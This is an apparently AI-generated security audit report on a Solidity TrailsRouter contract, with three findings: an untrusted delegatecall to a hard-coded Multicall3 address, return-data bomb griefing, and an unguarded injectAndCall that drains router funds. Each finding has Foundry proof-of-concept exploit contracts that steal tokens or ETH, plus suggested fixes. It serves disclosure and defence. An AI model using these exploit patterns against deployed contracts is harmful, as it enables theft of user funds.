# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern
gpt-5.1 "low" 2X
return 3 findings with 60% less cost


 **Derived From** : Delegatecall into external Multicall3 singleton without codehash/impl validation

[M-1]. Malicious contract at MULTICALL3 address lets attacker arbitrary-code-execute via TrailsRouter.execute/pullAmountAndExecute
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Unbounded return-data copying in balance injection calls enables return-bomb griefing

[L-2]. Unbounded returndata usage in _injectAndExecuteCall enables return-bomb gas griefing and DoS
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Public injectAndCall lets anyone drain tokens/ETH held by TrailsRouter implementation

[L-3]. Unprotected injectAndCall lets anyone sweep all ETH from TrailsRouter implementation address
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 1
- L: 2
- I: 0

##Findings by Pattern


 **Derived From** : Delegatecall into external Multicall3 singleton without codehash/impl validation

## [M-1]. Malicious contract at MULTICALL3 address lets attacker arbitrary-code-execute via TrailsRouter.execute/pullAmountAndExecute

### Finding Severity Justification: Impact can be full asset theft via arbitrary code execution when delegatecalling an unverified external contract; however exploitation requires deploying/operating on a chain where 0xcA11...CA11 is not the canonical Multicall3. On widely used networks this address is already canonical, reducing likelihood. The wallet-drain scenario is the worst case, but even in standalone use users can lose funds pulled into the router before the delegatecall.
## Derived From Pattern/Invariant
Delegatecall into external Multicall3 singleton without codehash/impl validation

## Exploit Type
UntrustedDelegateCall

## Location
TrailsRouter.execute / pullAmountAndExecute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter delegates to an external Multicall3 singleton at a hard‑coded address without validating that the code at that address is the canonical, trusted Multicall3 implementation.

Relevant code:

```solidity
address public immutable MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;

function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
    _validateRouterCall(data);
    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}

function pullAmountAndExecute(address token, uint256 amount, bytes calldata data)
    public
    payable
    returns (IMulticall3.Result[] memory returnResults)
{
    _validateRouterCall(data);
    if (token == address(0)) {
        if (msg.value < amount) revert InsufficientEth(amount, msg.value);
    } else {
        _safeTransferFrom(token, msg.sender, address(this), amount);
    }

    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}
```

Static characteristics:
- `MULTICALL3` is a literal address; the router does not deploy it or verify its bytecode.
- There is **no codehash check**, version check, or any enforcement that this address actually holds the canonical Multicall3 implementation.
- `delegatecall` executes the target code in the caller’s storage and balance context (TrailsRouter when called directly, or the Sequence wallet when TrailsRouter is delegatecalled from it).

Attack scenario:
1. On a chain where `0xcA11bde05977b3631167028862bE2a173976CA11` is *not yet* occupied by the canonical Multicall3 contract, an attacker deploys a malicious contract at that address (e.g., by pre‑deploying before TrailsRouter is deployed, or by using a testnet where anyone can claim that address via CREATE2 or direct deploy).
2. TrailsRouter is then deployed; its immutable `MULTICALL3` points to the already‑deployed malicious contract.
3. Any subsequent call to `execute` or `pullAmountAndExecute` will `delegatecall` into the attacker’s contract.
4. Because `delegatecall` preserves `msg.sender` and storage context, the malicious contract can:
   - When TrailsRouter is used directly: arbitrarily transfer any ERC‑20 tokens or ETH held by TrailsRouter, change its internal state, or make arbitrary external calls in TrailsRouter’s context.
   - When TrailsRouter is used via `delegatecall` from a Sequence v3 wallet (the intended production usage): execute arbitrary logic **in the wallet’s storage context**, including draining wallet assets, changing approvals, or subverting any other wallet‑level access controls.

`_validateRouterCall` only enforces that the selector equals `aggregate3Value` and that each call’s `allowFailure` is `false`; it does **not** ensure that the callee’s implementation is safe. A malicious contract can easily implement a function with the same signature as `aggregate3Value` but execute arbitrary code before returning a properly encoded `IMulticall3.Result[]` so the router never reverts.

Impact:
- On any chain where the canonical Multicall3 singleton is missing or replaced, **every call** to `execute` / `pullAmountAndExecute` becomes an arbitrary code execution primitive in the caller’s context.
- In the normal deploy pattern where TrailsRouter is used as a delegated extension inside Sequence wallets, this can directly lead to **complete takeover of user wallets on that chain**: transfer of all tokens, ETH, and change of critical wallet storage.

This is a textbook `UntrustedDelegateCall` issue: a hard‑coded external address is trusted for delegatecalls without verifying its implementation.

## Impact
On chains where 0xcA11…CA11 does not hold the canonical Multicall3, an attacker‑deployed contract at that address can execute arbitrary logic in the context of the caller (TrailsRouter or, more critically, the Sequence wallet delegating into it), allowing complete theft of wallet funds and arbitrary storage modification.

## Command to Run Test


## Proof of Concept
1. Assume we are on a chain/testnet where `0xcA11bde05977b3631167028862bE2a173976CA11` is not yet deployed with canonical Multicall3.
2. Attacker deploys a malicious contract `EvilMulticall` at that address. `EvilMulticall.aggregate3Value`:
   - Interprets `address(this)` as the delegating context (TrailsRouter or wallet),
   - Calls an ERC‑20 token’s `transfer(attacker, token.balanceOf(address(this)))`, draining all tokens held by the context,
   - Returns a dummy `IMulticall3.Result[]` so execution appears successful.
3. Protocol deploys `TrailsRouter`. Its `MULTICALL3` immutable is set to the attacker’s contract address.
4. A user or a Sequence wallet (via TrailsRouterShim) calls `TrailsRouter.execute` with any valid encoded `aggregate3Value(...)` input.
5. Inside `execute`, `_validateRouterCall` passes (the selector is correct).
6. `MULTICALL3.delegatecall(data)` runs `EvilMulticall.aggregate3Value` in the caller’s storage context:
   - If direct call: `address(this)` is `TrailsRouter`, so it drains `TrailsRouter`’s balances.
   - If delegatecalled from a Sequence wallet: `address(this)` is the wallet, so it drains all wallet tokens.
7. Call returns successfully, `execute` decodes results and returns them. From the caller’s perspective, no error occurs, but funds have been stolen.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is IERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function _mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
}

// Malicious contract pretending to be Multicall3
contract EvilMulticall {
    address public attacker;
    IERC20 public token;

    constructor(address _attacker, IERC20 _token) {
        attacker = _attacker;
        token = _token;
    }

    // Matches IMulticall3.aggregate3Value selector (0x174dea71)
    function aggregate3Value(IMulticall3.Call3Value[] calldata)
        external
        payable
        returns (IMulticall3.Result[] memory returnData)
    {
        // Drain all token balance from the delegating context (TrailsRouter or wallet)
        uint256 bal = token.balanceOf(address(this));
        if (bal > 0) {
            token.transfer(attacker, bal);
        }

        // Return empty results to keep TrailsRouter.execute from reverting
        returnData = new IMulticall3.Result[](0);
    }
}

contract UntrustedDelegateCallTest is Test {
    TrailsRouter router;
    MockERC20 token;
    address attacker = address(0xBEEF);

    function setUp() public {
        // Deploy mock token
        token = new MockERC20();

        // Forge cheatcode: deploy EvilMulticall code at the hard-coded MULTICALL3 address
        address multicallAddr = 0xcA11bde05977b3631167028862bE2a173976CA11;
        EvilMulticall evil = new EvilMulticall(attacker, IERC20(address(token)));
        // Overwrite code at MULTICALL3 address with EvilMulticall runtime
        vm.etch(multicallAddr, address(evil).code);

        // Deploy TrailsRouter; its MULTICALL3 immutable now points to evil code
        router = new TrailsRouter();

        // Fund the router with tokens (simulating balances in delegating context)
        token._mint(address(router), 1_000 ether);
    }

    function test_EvilMulticallDrainsRouterTokens_viaExecute() public {
        // Sanity: router holds tokens at start
        assertEq(token.balanceOf(address(router)), 1_000 ether);
        assertEq(token.balanceOf(attacker), 0);

        // Prepare dummy aggregate3Value calldata
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: ""
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        // Anyone can call execute; attacker doesn't need special privileges
        vm.prank(attacker);
        IMulticall3.Result[] memory results = router.execute(data);
        // Just to silence unused variable warning
        results;

        // Assert all router tokens were drained to attacker
        assertEq(token.balanceOf(address(router)), 0);
        assertEq(token.balanceOf(attacker), 1_000 ether);
    }
}


## Suggested Mitigation
Add runtime validation that the `MULTICALL3` address actually contains the expected canonical Multicall3 bytecode before any delegatecall. For example:
- At deployment, compute and store the expected codehash of the canonical Multicall3 implementation.
- In `execute` and `pullAmountAndExecute`, before `delegatecall`, compare `MULTICALL3.codehash` (or `extcodehash`) with the expected hash and revert if it does not match.
Alternatively, remove the external singleton dependency and deploy a vetted Multicall3 implementation as part of the Trails deployment itself, storing its address in an immutable so that the router always delegates to a contract whose code is owned and controlled by the protocol.





 **Derived From** : Unbounded return-data copying in balance injection calls enables return-bomb griefing

## [L-2]. Unbounded returndata usage in _injectAndExecuteCall enables return-bomb gas griefing and DoS

### Finding Severity Justification: The issue enables a return-data ‘bomb’ that can increase gas usage or cause out-of-gas reverts by returning large bytes, which are then copied to memory, emitted in an event, and potentially bubbled up in a revert. However, impact is limited to DoS/griefing of the specific call flow; there is no direct or indirect loss of user assets. Attackers must target a route that calls a malicious adapter, and they or the relayer would pay the gas. This is a general availability/griefing concern rather than an asset-compromising bug.
## Derived From Pattern/Invariant
Unbounded return-data copying in balance injection calls enables return-bomb griefing

## Exploit Type
Dos

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The balance injection helper `_injectAndExecuteCall` performs an arbitrary external `target.call` and then copies the full return data into memory, emits it in an event, and (on failure) re-uses it in a revert. There is no limit or truncation on the size of `result`.

Relevant code:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    ...
    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}
```

Static properties:
* `target` is arbitrary, supplied directly via `injectSweepAndCall` / `injectAndCall` (external or delegatecall context).
* Calls forward nearly all remaining gas to `target.call(...)`.
* The returned `bytes result` is:
  * allocated and copied into memory (cost proportional to length),
  * emitted in the `BalanceInjectorCall` event, and
  * passed again as revert data if `success == false`.

A malicious target can deliberately return extremely large returndata (e.g., via a loop writing to memory and returning), causing:

* Very high gas consumption for copying `result` into memory and for emitting the event;
* Potential out-of-gas or memory expansion failures in the router itself, preventing successful execution;
* In delegatecall context (Sequence wallets) this can render certain intents effectively unexecutable, since any attempt to call the malicious adapter will OOG or hit block gas limits.

Because these helpers are generic plumbing intended to be pointed at arbitrary DEX/bridge/vault adapters, the router should defensively limit returndata handling. As written, a single misconfigured or malicious target can grief relayers and users by making their intents fail or become too expensive to execute.

## Impact
A malicious target called via injectAndCall/injectSweepAndCall can grief execution by returning or reverting with arbitrarily large returndata. TrailsRouter copies the full returndata into memory, emits it in BalanceInjectorCall, and (on failure) reverts with it again. This can add hundreds of thousands to millions of gas (≈8 gas/byte for log data alone, plus memory copy/expansion), pushing transactions to out-of-gas or block gas limits and making specific routes effectively unexecutable. While assets are not at risk, availability is impacted and relayers/users may incur significant gas waste. Similar unbounded bubbling exists in execute/pull* paths when reverting with large returndata.

## Command to Run Test


## Proof of Concept
1) Attacker deploys a malicious adapter that returns or reverts with very large bytes. 2) A route points to this adapter as target in injectAndCall or injectSweepAndCall (with amountOffset=0 and placeholder=0 to disable injection). 3) When TrailsRouter invokes _injectAndExecuteCall, the call copies the entire returndata into memory, emits it via BalanceInjectorCall, and if the call failed, reverts with the same bytes. 4) The large bytes cause substantial gas consumption for memory copying and logging; with sufficiently large payloads the transaction can OOG, repeatedly DoS-ing attempts to execute that route.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";

contract ReturnBombGasGriefingTest is Test {
    TrailsRouter router;
    ReturnBomber bomber;

    function setUp() public {
        router = new TrailsRouter();
        bomber = new ReturnBomber();
        // Pre-fund the router so injectAndCall forwards value
        vm.deal(address(router), 2 ether);
    }

    function test_GasGrowsWithReturnDataSize() public {
        // Small returndata
        bytes memory callSmall = abi.encodeWithSelector(ReturnBomber.bomb.selector, uint256(32), false);
        uint256 gSmallBefore = gasleft();
        router.injectAndCall(address(0), address(bomber), callSmall, 0, bytes32(0));
        uint256 gasUsedSmall = gSmallBefore - gasleft();

        // Large returndata (100k bytes)
        bytes memory callLarge = abi.encodeWithSelector(ReturnBomber.bomb.selector, uint256(100_000), false);
        uint256 gLargeBefore = gasleft();
        router.injectAndCall(address(0), address(bomber), callLarge, 0, bytes32(0));
        uint256 gasUsedLarge = gLargeBefore - gasleft();

        // Emitting and copying 100k bytes should add >600k gas reliably (8 gas/byte for LOG data + copy/expansion)
        assertGt(gasUsedLarge - gasUsedSmall, 600_000);
    }

    function test_RevertPathAlsoCopiesLargeRevertData() public {
        // Top up router balance for this call
        vm.deal(address(router), address(router).balance + 1 ether);

        // Large revert data
        bytes memory callLargeRevert = abi.encodeWithSelector(ReturnBomber.bomb.selector, uint256(100_000), true);
        vm.expectRevert();
        router.injectAndCall(address(0), address(bomber), callLargeRevert, 0, bytes32(0));
    }
}

contract ReturnBomber {
    // Returns or reverts with a bytes payload of arbitrary size
    function bomb(uint256 size, bool shouldRevert) external payable returns (bytes memory) {
        bytes memory data = new bytes(size);
        if (shouldRevert) {
            assembly {
                revert(add(data, 32), mload(data))
            }
        }
        return data;
    }
}


## Suggested Mitigation
Do not unconditionally materialize and propagate arbitrary-length returndata. Use assembly call to cap copied returndata at a safe maximum, and avoid logging full blobs:
- In _injectAndExecuteCall, perform the external call in assembly and copy only min(returndatasize(), MAX_BYTES) into a temporary buffer. Emit a truncated bytes (or better, emit keccak256(result) plus length) to retain debuggability without allowing log-bombs.
- On failure, revert with a fixed custom error (e.g., TargetCallFailed()) or a truncated payload (again capped at MAX_BYTES). Avoid surfacing attacker-controlled megabyte-scale revert data.
- Apply the same pattern to execute/pull* paths that currently revert with unbounded returnData.
- Choose a conservative MAX_BYTES (e.g., 256–1024) and document the truncation behavior for integrators.





 **Derived From** : Public injectAndCall lets anyone drain tokens/ETH held by TrailsRouter implementation

## [L-3]. Unprotected injectAndCall lets anyone sweep all ETH from TrailsRouter implementation address

### Finding Severity Justification: injectAndCall is publicly callable without the onlyDelegatecall guard and will forward the entire TrailsRouter implementation’s own ETH/token balance to an arbitrary target. While the behavior is real and contradicts the function’s comment (intended for delegatecall context), the impact is limited to funds that end up at the Router implementation address (e.g., accidental transfers, misconfigured calls, selfdestruct/airdrop). No user wallet or protocol-controlled assets are directly at risk under normal flows. This aligns with user/integration mistake scenarios, which are QA/Low under the rubric.
## Derived From Pattern/Invariant
Public injectAndCall lets anyone drain tokens/ETH held by TrailsRouter implementation

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `injectAndCall` function is public and **not** restricted by the `onlyDelegatecall` guard, yet it operates on `_getSelfBalance(token)`, which for direct calls is the TrailsRouter implementation’s own balance.

Relevant code:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

function _getSelfBalance(address token) internal view returns (uint256) {
    return _getBalance(token, address(this));
}

function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... optional placeholder replacement ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}
```

Key points:
- There is **no `onlyDelegatecall` or other access control** on `injectAndCall`.
- `_getSelfBalance(token)` reads `address(this)`; when called directly, this is the TrailsRouter implementation contract itself.
- For `token == address(0)` (native ETH), `_injectAndExecuteCall` forwards **the entire router ETH balance** as `value` to an arbitrary `target` supplied by the caller.

Impact:
- Any ETH accidentally or indirectly sent to the TrailsRouter implementation address (via:
  - erroneous end‑user transfers,
  - misconfigured integrations sending `msg.value` while using the ERC‑20 branch of `pullAndExecute`,
  - selfdestruct of another contract pointing to the router address,
  ) becomes **freely withdrawable by any attacker**.
- An attacker can repeatedly call `injectAndCall(address(0), attacker, "", 0, 0)` to drain whatever native balance the router holds at that moment.
- Similarly, if ERC‑20 tokens are sent to the router address, the attacker can set `token` to that ERC‑20 and `target` to a contract that uses the granted allowance to pull the entire router balance.

While the protocol design aims for the router to be stateless and not hold funds, in practice contracts routinely accumulate stray funds via user mistakes or edge‑case flows (e.g., the `pullAndExecute` ERC‑20 branch ignores non‑zero `msg.value`). This access‑control bug turns such accidental balances into a **public honeypot** instead of letting them remain recoverable (e.g. via an admin sweep or user refund flow).

## Impact
Any ETH or ERC-20 tokens that end up on the TrailsRouter implementation address (e.g., accidental msg.value in ERC20 flows, direct transfers, selfdestructs, airdrops) can be unconditionally drained by anyone via injectAndCall. For ERC-20, the function grants allowance to the attacker-controlled target and invokes it, enabling the target to transferFrom the entire router-held balance out. While the router is intended to be stateless, such stray balances are realistically possible, and this bug makes them publicly stealable instead of recoverable.

## Command to Run Test


## Proof of Concept
ETH drain
1) Fund the TrailsRouter implementation with ETH (direct transfer or misconfigured call sending msg.value).
2) Call injectAndCall with: token = address(0), target = attacker EOA or contract, callData = empty bytes, amountOffset = 0, placeholder = 0.
3) The router computes callerBalance = address(this).balance and executes target.call{value: callerBalance}(""). All ETH moves to the attacker.

ERC-20 drain
1) Transfer ERC-20 tokens to the TrailsRouter implementation.
2) Call injectAndCall with: token = ERC-20 address, target = attacker contract, callData = ABI-encoded call to a function that calls transferFrom(router, attacker, amount), amountOffset = 0, placeholder = 0.
3) The router force-approves the target for its entire ERC-20 balance, then calls the target. The target spends the allowance via transferFrom to pull all tokens from the router to the attacker.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DrainReceiver {
    event Received(uint256 amount);
    receive() external payable {
        emit Received(msg.value);
    }
}

contract MockERC20 is ERC20("Mock", "MOCK") {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

// Target that will pull tokens using allowance granted by router
contract TokenDrainerTarget {
    function drain(address token, address owner, address to) external {
        uint256 amt = IERC20(token).balanceOf(owner);
        IERC20(token).transferFrom(owner, to, amt);
    }
}

contract InjectAndCallDrainTest is Test {
    TrailsRouter router;
    DrainReceiver attackerEth;
    MockERC20 mock;
    TokenDrainerTarget drainer;

    function setUp() public {
        router = new TrailsRouter();
        attackerEth = new DrainReceiver();
        mock = new MockERC20();
        drainer = new TokenDrainerTarget();

        // Fund router with ETH (simulating accidental transfer)
        vm.deal(address(this), 10 ether);
        (bool ok,) = address(router).call{value: 10 ether}("");
        require(ok, "fund router failed");
        assertEq(address(router).balance, 10 ether);

        // Fund router with ERC20 (simulating accidental token transfer)
        mock.mint(address(router), 1_000 ether);
        assertEq(mock.balanceOf(address(router)), 1_000 ether);
    }

    function test_AnyoneCanDrainRouterEthViaInjectAndCall() public {
        address eoaAttacker = address(0xBEEF);
        vm.prank(eoaAttacker);
        router.injectAndCall({
            token: address(0),
            target: address(attackerEth),
            callData: bytes(""),
            amountOffset: 0,
            placeholder: bytes32(0)
        });
        assertEq(address(router).balance, 0, "router ETH drained");
        assertEq(address(attackerEth).balance, 10 ether, "attacker received ETH");
    }

    function test_AnyoneCanDrainRouterErc20ViaInjectAndCall() public {
        address eoaAttacker = address(0xCAFE);
        uint256 start = mock.balanceOf(eoaAttacker);
        assertEq(start, 0);

        bytes memory data = abi.encodeWithSignature(
            "drain(address,address,address)",
            address(mock),
            address(router),
            eoaAttacker
        );

        vm.prank(address(0xDEAD)); // any caller
        router.injectAndCall({
            token: address(mock),
            target: address(drainer),
            callData: data,
            amountOffset: 0,
            placeholder: bytes32(0)
        });

        assertEq(mock.balanceOf(address(router)), 0, "router token drained");
        assertEq(mock.balanceOf(eoaAttacker), 1_000 ether, "attacker received tokens");
    }
}


## Suggested Mitigation
Add onlyDelegatecall to injectAndCall so it cannot be used directly on the Router implementation:

function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable onlyDelegatecall { ... }

This does not affect delegated usage because handleSequenceDelegateCall already decodes the injectAndCall payload and invokes _injectAndCallDelegated internally.

Additionally, to reduce stray-funds risk: either (a) make receive() revert to prevent accidental ETH transfers to the Router, or (b) add an owner/role-gated rescue function to sweep ETH/tokens from the Router implementation in emergencies. Clearly document that the Router is not intended to custody funds.



